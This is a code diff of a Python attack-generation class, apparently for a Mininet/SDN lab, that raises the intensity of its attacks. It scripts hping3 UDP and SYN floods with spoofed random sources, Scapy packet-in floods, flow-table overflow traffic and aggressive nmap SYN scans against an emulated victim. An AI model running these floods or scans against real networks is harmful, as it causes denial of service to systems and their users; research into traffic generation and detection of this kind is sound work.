@@ -1,5 +1,4 @@
 import random
-import time
 
 class AttackManager:
     def __init__(self, net):
@@ -9,74 +8,84 @@ class AttackManager:
         self.active_pids = []
 
     # ================================
-    # DDoS
+    # DDoS (High Diversity)
     # ================================
     def ddos_flood(self):
-        print(f"[*] Starting DDoS flood: {len(self.attackers)} hosts -> {self.victim.IP()}")
+        print(f"[*] INTENSE DDoS: {len(self.attackers)} hosts -> {self.victim.IP()}")
+
         for attacker in self.attackers:
-            for _ in range(5):  # Mỗi attacker tạo 3 luồng tấn công
-            # Chạy ngầm (&), ẩn output (> /dev/null), và lấy PID ($!)
-                cmd = f'hping3 --flood --udp -p 80 {self.victim.IP()} --flood > /dev/null 2>&1 & echo $!'
+            for _ in range(10):  # tăng mạnh intensity
+                cmd = (
+                    f'hping3 --flood --rand-source '
+                    f'-p {random.randint(1,65535)} '
+                    f'{self.victim.IP()} --fast > /dev/null 2>&1 & echo $!'
+                )
                 pid = attacker.cmd(cmd).strip()
                 self.active_pids.append((attacker, pid))
 
     # ================================
-    # Packet-In Flood
+    # Packet-In Flood (Flow Explosion)
     # ================================
     def packet_in_flood(self):
         attacker = random.choice(self.attackers)
-        print(f"[*] Packet-In Flood từ {attacker.name} -> {self.victim.IP()}")
-        # Scapy gửi gói tin TCP với port ngẫu nhiên liên tục
-        for _ in range(5):  # Tạo nhiều luồng tấn công
+        print(f"[*] INTENSE Packet-In Flood từ {attacker.name}")
+
+        for _ in range(10):
             cmd = (
                 f'python3 -c "from scapy.all import *; '
                 f'send(IP(dst=\\"{self.victim.IP()}\\")/'
                 f'TCP(sport=RandShort(), dport=RandShort()), '
-                f'loop=1, verbose=0)" '
+                f'loop=1, inter=0, verbose=0)" '
                 f'> /dev/null 2>&1 & echo $!'
             )
             pid = attacker.cmd(cmd).strip()
             self.active_pids.append((attacker, pid))
 
     # ================================
-    # Flow Table Overflow
+    # Flow Table Overflow (Max Diversity)
     # ================================
     def flow_overflow(self):
-        # Tấn công lấp đầy bảng flow nhanh nhất là dùng hping3 với IP nguồn giả mạo ngẫu nhiên
         attacker = random.choice(self.attackers)
-        print(f"[*] Flow Table Overflow từ {attacker.name}...")
-        for _ in range(10):  # Tạo nhiều luồng tấn công
-            cmd = f'hping3 --flood --rand-source -S -p 80 {self.victim.IP()} > /dev/null 2>&1 & echo $!'
-            pid = attacker.cmd(cmd).strip()
-            self.active_pids.append((attacker, pid))
+        print(f"[*] INTENSE Flow Overflow từ {attacker.name}")
 
-    # ================================
-    # IP Spoofing
-    # ================================
-    def ip_spoofing(self):
-        attacker = random.choice(self.attackers)
-        print(f"[*] IP Spoofing từ {attacker.name}")
-
-        for _ in range(5):  # tăng intensity
-            fake_ip = f"10.0.0.{random.randint(100,200)}"
+        for _ in range(20):
             cmd = (
-                f'hping3 --flood -S -a {fake_ip} '
+                f'hping3 --flood --rand-source '
+                f'-S -p {random.randint(1,65535)} '
                 f'{self.victim.IP()} --fast > /dev/null 2>&1 & echo $!'
             )
             pid = attacker.cmd(cmd).strip()
             self.active_pids.append((attacker, pid))
 
     # ================================
-    # Port Scanning
+    # IP Spoofing (Entropy Booster)
+    # ================================
+    def ip_spoofing(self):
+        attacker = random.choice(self.attackers)
+        print(f"[*] INTENSE IP Spoofing từ {attacker.name}")
+
+        for _ in range(15):
+            fake_ip = f"10.0.0.{random.randint(100,250)}"
+            cmd = (
+                f'hping3 --flood --rand-source '
+                f'-S -a {fake_ip} '
+                f'-p {random.randint(1,65535)} '
+                f'{self.victim.IP()} --fast > /dev/null 2>&1 & echo $!'
+            )
+            pid = attacker.cmd(cmd).strip()
+            self.active_pids.append((attacker, pid))
+
+    # ================================
+    # Port Scanning (Aggressive)
     # ================================
     def port_scanning(self):
         attacker = random.choice(self.attackers)
-        print(f"[*] Port Scanning từ {attacker.name}...")
-        # Quét dồn dập nhiều port
-        for _ in range(5):  # Tạo nhiều luồng tấn công
+        print(f"[*] INTENSE Port Scanning từ {attacker.name}")
+
+        for _ in range(5):
             cmd = (
-                f'nmap -sT -p 1-65535 -T5 {self.victim.IP()} '
-                f'> /dev/null 2>&1 & echo $!'
+                f'nmap -sS -p 1-65535 -T5 --max-retries 1 '
+                f'{self.victim.IP()} > /dev/null 2>&1 & echo $!'
             )
             pid = attacker.cmd(cmd).strip()
             self.active_pids.append((attacker, pid))
@@ -85,14 +94,15 @@ class AttackManager:
     # STOP ALL
     # ================================
     def stop_all(self):
-        print("[*] Đang dừng tất cả các tiến trình tấn công...")
+        print("[*] Stopping all attacks...")
         for attacker, pid in self.active_pids:
             try:
                 attacker.cmd(f'kill -9 {pid}')
             except:
                 pass
-        # Dọn dẹp triệt để trên toàn bộ các host
+
         for host in self.attackers:
             host.cmd('pkill -9 hping3 nmap python3')
+
         self.active_pids.clear()
-        print("[+] Hệ thống đã sạch tấn công.")
+        print("[+] Attack stopped.")
